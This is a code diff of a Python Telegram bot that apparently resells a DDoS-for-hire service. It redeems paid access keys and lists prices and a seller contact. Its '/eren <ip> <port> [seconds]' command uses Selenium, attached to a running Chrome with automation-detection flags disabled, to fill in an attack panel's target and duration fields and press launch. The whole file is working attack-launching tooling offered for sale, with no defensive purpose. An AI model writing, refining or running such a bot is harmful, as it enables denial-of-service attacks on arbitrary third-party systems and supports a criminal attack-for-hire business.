@@ -46,6 +46,7 @@ def init_db():
         c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, registered_at TEXT)''')
         c.execute('''CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, days INTEGER, created_at TEXT, used_by INTEGER DEFAULT NULL, used_at TEXT)''')
         conn.commit()
+
 init_db()
 
 # ──────── Helpers ────────
@@ -76,7 +77,7 @@ def redeem_key(key: str, user_id: int) -> tuple[bool, str]:
         conn.commit()
     return True, f"✅ Key redeemed! Valid for {days} days."
 
-# ──────── Selenium ────────
+# ──────── Selenium (Using Existing Chrome on Port 9222) ────────
 driver: uc.Chrome = None
 wait: WebDriverWait = None
 
@@ -86,47 +87,60 @@ def init_browser():
         options = uc.ChromeOptions()
         options.add_argument("--no-sandbox")
         options.add_argument("--disable-dev-shm-usage")
-
-        driver = uc.Chrome(options=options)
+        options.add_argument("--disable-blink-features=AutomationControlled")
+        options.add_argument("--disable-gpu")
+        
+        # Connect to already running Chrome (started by .sh file)
+        driver = uc.Chrome(
+            options=options,
+            debugger_address="127.0.0.1:9222",
+            version_main=133  # ← Change this if your Chrome version is different
+        )
+        
         wait = WebDriverWait(driver, 25)
-
-        logger.info(f"🌐 Opening panel: {PANEL_URL}")
-        driver.get(PANEL_URL)
         
-        logger.info("✅ opened and node loaded automatically!")
-        logger.info("Wait 5-10 seconds for full load before attacking.")
+        # Open panel only if not already there
+        if PANEL_URL not in driver.current_url:
+            logger.info(f"🌐 Opening panel: {PANEL_URL}")
+            driver.get(PANEL_URL)
+        else:
+            logger.info("✅ Already on panel page.")
         
+        logger.info("✅ Connected to node successfully!")
+        logger.info("Wait 5-10 seconds after bot start for full load.")
+       
     except Exception as e:
         logger.error(f"Browser init failed: {e}")
         raise
 
+# ──────── Attack Function ────────
 async def send_attack(ip: str, port: str, seconds: int):
     global driver
     if driver is None:
         init_browser()
-
+    
     try:
         # IP
         el = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, IP_SELECTOR)))
         el.clear()
         el.send_keys(ip)
-
+        
         # Port
         el = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, PORT_SELECTOR)))
         el.clear()
         el.send_keys(port)
-
+        
         # Time
         el = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, TIME_SELECTOR)))
         el.clear()
         el.send_keys(str(seconds))
-
+        
         # Launch Button
         btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, LAUNCH_BUTTON_SELECTOR)))
         btn.click()
-
+        
         return True, f"✅ **Attack Started**\nTarget: `{ip}:{port}`\nDuration: {seconds}s"
-
+    
     except Exception as e:
         return False, f"❌ Error: {str(e)}"
 
@@ -134,13 +148,13 @@ async def send_attack(ip: str, port: str, seconds: int):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     username = update.effective_user.username or "User"
-    
+   
     with sqlite3.connect(DB_FILE) as conn:
         c = conn.cursor()
         c.execute("INSERT OR IGNORE INTO users (user_id, username, registered_at) VALUES (?,?,?)",
                   (uid, username, datetime.now().isoformat()))
         conn.commit()
-
+    
     welcome_text = (
         "👋 **Welcome to Bot!** 🚀\n\n"
         "🔥 **Fast 3 Node Serverr**\n"
@@ -162,23 +176,23 @@ async def eren(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(args) < 2:
         await update.message.reply_text("Usage: `/eren <ip> <port> [seconds]`", parse_mode="Markdown")
         return
-
+    
     ip = args[0].strip()
     port = args[1].strip()
     try:
         seconds = int(args[2]) if len(args) >= 3 else DEFAULT_TIME
     except ValueError:
         seconds = DEFAULT_TIME
-
-    if seconds > MAX_TIME: 
+    
+    if seconds > MAX_TIME:
         seconds = MAX_TIME
     if seconds < 10:
         await update.message.reply_text("❌ Minimum time is 10 seconds.")
         return
-
+    
     msg = await update.message.reply_text("🔄 **Preparing Attack...**")
-
     success, result = await send_attack(ip, port, seconds)
+    
     if success:
         await msg.edit_text(result, parse_mode="Markdown")
         await asyncio.sleep(seconds + 3)
@@ -189,7 +203,7 @@ async def eren(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def price(update: Update, context: ContextTypes.DEFAULT_TYPE):
     price_text = (
         "💰 **Pricing**\n\n"
-        "• 1 Day  → 50₹\n"
+        "• 1 Day → 50₹\n"
         "• 7 Days → 300₹\n"
         "• Resellers DM\n\n"
         "Contact @LFX_EREN for purchase."
@@ -232,7 +246,7 @@ async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def main():
     app = Application.builder().token(TOKEN).build()
     app.bot_data["start_time"] = time.time()
-
+    
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("help", help_cmd))
     app.add_handler(CommandHandler("eren", eren))
@@ -241,10 +255,10 @@ def main():
     app.add_handler(CommandHandler("genkey", genkey))
     app.add_handler(CommandHandler("redeem", redeem))
     app.add_handler(CommandHandler("uptime", uptime))
-
+    
     app.add_handler(MessageHandler(filters.COMMAND, lambda u,c: u.message.reply_text("Unknown command. Try /help")))
-
-    print("🤖 Bot starting... Auto-opening panel...")
+    
+    print("🤖 Bot starting... ")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
